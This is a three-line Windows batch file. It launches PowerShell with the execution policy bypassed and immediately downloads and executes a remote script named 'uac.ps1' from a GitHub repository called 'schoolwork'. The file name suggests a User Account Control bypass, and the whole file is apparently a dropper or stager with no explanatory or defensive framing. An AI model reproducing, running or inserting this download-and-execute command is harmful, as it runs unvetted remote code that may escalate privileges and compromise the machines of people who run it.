@echo off
powershell -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/poorkid8921/schoolwork/refs/heads/main/uac.ps1'))"
exit /b
